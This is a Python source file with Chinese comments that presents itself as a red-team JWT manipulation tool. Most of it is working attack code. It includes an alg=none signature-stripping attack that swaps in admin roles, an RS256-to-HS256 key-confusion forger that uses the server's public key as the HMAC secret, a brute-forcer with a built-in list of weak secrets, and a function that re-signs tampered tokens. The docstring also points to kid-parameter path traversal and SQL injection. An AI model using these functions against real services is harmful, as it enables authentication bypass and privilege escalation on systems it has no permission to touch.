"""
JWT 操纵工具.

支持:
    1. 解码 JWT (无需密钥)
    2. 算法混淆攻击 (alg=none / RS256→HS256)
    3. 密钥暴力破解
    4. JWT 伪造 (修改 payload + 重新签名)

红队场景:
    - alg=none: 很多库接受无签名 JWT
    - RS256→HS256: 用公钥当 HMAC 密钥
    - 弱密钥: secret/password/123456 等
    - kid 注入: 通过 kid 参数做路径遍历/SQL注入
"""

import base64
import hmac
import hashlib
import json
import time
from typing import Dict, Any, Optional, Tuple, List
from dataclasses import dataclass


def _b64decode(data: str) -> bytes:
    """JWT base64 解码 (补 padding)"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64encode(data: bytes) -> str:
    """JWT base64 编码 (去 padding)"""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


@dataclass
class JWTParts:
    """JWT 解码后的三部分"""
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: bytes
    raw_header: str
    raw_payload: str
    raw_signature: str


class JWTTool:
    """
    JWT 操纵工具.

    用法:
        tool = JWTTool()

        # 解码
        parts = tool.decode(token)

        # 算法混淆攻击
        none_token = tool.alg_none_attack(token, {"user": "admin", "role": "superuser"})

        # 密钥暴力
        cracked = tool.brute_key(token, ["secret", "password", "123456"])

        # 伪造
        forged = tool.forge(token, secret="cracked_key",
                           payload_mods={"role": "admin"})
    """

    # 常见弱密钥 (JWT secret 爆破)
    COMMON_SECRETS = [
        "secret", "password", "123456", "admin", "key", "jwt",
        "jwt-secret", "token", "my-secret", "app-secret",
        "your-256-bit-secret", "supersecret", "changeme",
        "default", "test", "debug", "root", "abc123",
        "",  # 空密钥
    ]

    # ============================================================
    # 解码
    # ============================================================

    def decode(self, token: str) -> Optional[JWTParts]:
        """解码 JWT (不验证签名), 返回三部分"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            header = json.loads(_b64decode(parts[0]))
            payload = json.loads(_b64decode(parts[1]))
            signature = _b64decode(parts[2])

            return JWTParts(
                header=header,
                payload=payload,
                signature=signature,
                raw_header=parts[0],
                raw_payload=parts[1],
                raw_signature=parts[2],
            )
        except Exception:
            return None

    # ============================================================
    # 算法混淆攻击
    # ============================================================

    def alg_none_attack(self, token: str,
                        payload_mods: Optional[Dict[str, Any]] = None) -> str:
        """
        alg=none 攻击.

        将 JWT 的 alg 改为 none, 移除签名.
        很多库 (旧版 pyjwt/jsonwebtoken) 接受无签名 JWT.

        Args:
            token:       原 JWT
            payload_mods: 要修改的 payload 字段 {"role": "admin"}
        """
        parts = self.decode(token)
        if not parts:
            return ""

        # 修改 header: alg → none
        new_header = {"alg": "none", "typ": "JWT"}
        # 保留 kid 等其它字段
        for k, v in parts.header.items():
            if k not in ("alg", "typ"):
                new_header[k] = v

        # 修改 payload
        new_payload = dict(parts.payload)
        if payload_mods:
            new_payload.update(payload_mods)

        # 构造无签名 JWT
        header_b64 = _b64encode(json.dumps(new_header, separators=(",", ":")).encode())
        payload_b64 = _b64encode(json.dumps(new_payload, separators=(",", ":")).encode())

        # alg=none 的签名部分为空 (或任意)
        return f"{header_b64}.{payload_b64}."

    def alg_confusion(self, token: str, public_key: str) -> str:
        """
        RS256→HS256 算法混淆攻击.

        前提: 服务端用 RS256 (非对称), 但验证时用 header 里的 alg.
        攻击: 把 alg 改成 HS256, 用公钥当 HMAC 密钥签名.

        Args:
            token:      原 JWT (RS256 签名)
            public_key: 服务端的 RSA 公钥 (PEM 格式)
        """
        parts = self.decode(token)
        if not parts:
            return ""

        new_header = {"alg": "HS256", "typ": "JWT"}
        for k, v in parts.header.items():
            if k not in ("alg", "typ"):
                new_header[k] = v

        header_b64 = _b64encode(json.dumps(new_header, separators=(",", ":")).encode())
        payload_b64 = _b64encode(json.dumps(parts.payload, separators=(",", ":")).encode())

        # 用公钥当 HMAC 密钥
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
        sig_b64 = _b64encode(signature)

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    # ============================================================
    # 密钥暴力
    # ============================================================

    def brute_key(self, token: str,
                  wordlist: Optional[List[str]] = None,
                  ) -> Optional[str]:
        """
        HMAC 密钥暴力破解.

        尝试 wordlist 里的每个密钥, 看哪个能验证签名.
        只对 HS256/HS384/HS512 有效 (对称加密).

        Returns:
            破解出的密钥, 或 None
        """
        parts = self.decode(token)
        if not parts:
            return None

        alg = parts.header.get("alg", "")
        if not alg.startswith("HS"):
            return None  # 非对称算法不能暴力

        # 选择 hash
        hash_map = {"HS256": hashlib.sha256,
                    "HS384": hashlib.sha384,
                    "HS512": hashlib.sha512}
        hash_fn = hash_map.get(alg)
        if not hash_fn:
            return None

        wordlist = wordlist or self.COMMON_SECRETS
        message = f"{parts.raw_header}.{parts.raw_payload}".encode()

        for secret in wordlist:
            sig = hmac.new(secret.encode(), message, hash_fn).digest()
            if hmac.compare_digest(sig, parts.signature):
                return secret

        return None

    # ============================================================
    # JWT 伪造
    # ============================================================

    def forge(self, token: str, secret: str,
              payload_mods: Optional[Dict[str, Any]] = None,
              header_mods: Optional[Dict[str, Any]] = None,
              alg: str = "HS256") -> str:
        """
        用已知密钥伪造 JWT.

        Args:
            token:        原 JWT (用于提取结构)
            secret:       HMAC 密钥
            payload_mods: 要修改的 payload 字段
            header_mods:  要修改的 header 字段
            alg:          签名算法
        """
        parts = self.decode(token)

        # 构造 header
        if parts:
            new_header = dict(parts.header)
        else:
            new_header = {"typ": "JWT"}
        new_header["alg"] = alg
        if header_mods:
            new_header.update(header_mods)

        # 构造 payload
        if parts:
            new_payload = dict(parts.payload)
        else:
            new_payload = {}
        if payload_mods:
            new_payload.update(payload_mods)

        # 签名
        hash_map = {"HS256": hashlib.sha256,
                    "HS384": hashlib.sha384,
                    "HS512": hashlib.sha512}
        hash_fn = hash_map.get(alg, hashlib.sha256)

        header_b64 = _b64encode(json.dumps(new_header, separators=(",", ":")).encode())
        payload_b64 = _b64encode(json.dumps(new_payload, separators=(",", ":")).encode())
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(secret.encode(), message, hash_fn).digest()
        sig_b64 = _b64encode(signature)

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    # ============================================================
    # 信息提取
    # ============================================================

    def analyze(self, token: str) -> Dict[str, Any]:
        """
        分析 JWT, 提取安全相关信息.

        Returns:
            {
                "header": {...},
                "payload": {...},
                "alg": "HS256",
                "issues": ["weak-alg", "no-exp", ...],
                "exp": timestamp or None,
                "expired": bool,
            }
        """
        parts = self.decode(token)
        if not parts:
            return {"error": "invalid-jwt"}

        issues = []
        alg = parts.header.get("alg", "")

        # 弱算法
        if alg.lower() == "none":
            issues.append("alg-none")
        if alg in ("HS256",) and "kid" in parts.header:
            issues.append("kid-present")

        # 过期检查
        exp = parts.payload.get("exp")
        expired = False
        if exp:
            if time.time() > exp:
                expired = True
                issues.append("expired")
        else:
            issues.append("no-exp")

        # 敏感信息
        for key in ("password", "secret", "key", "token"):
            if key in parts.payload:
                issues.append(f"sensitive-field:{key}")

        # 权限字段
        for key in ("role", "admin", "isAdmin", "is_admin", "privilege", "permissions"):
            if key in parts.payload:
                val = parts.payload[key]
                if val in ("admin", True, "superuser", 1):
                    issues.append(f"high-privilege:{key}={val}")

        return {
            "header": parts.header,
            "payload": parts.payload,
            "alg": alg,
            "issues": issues,
            "exp": exp,
            "expired": expired,
            "raw": token,
        }
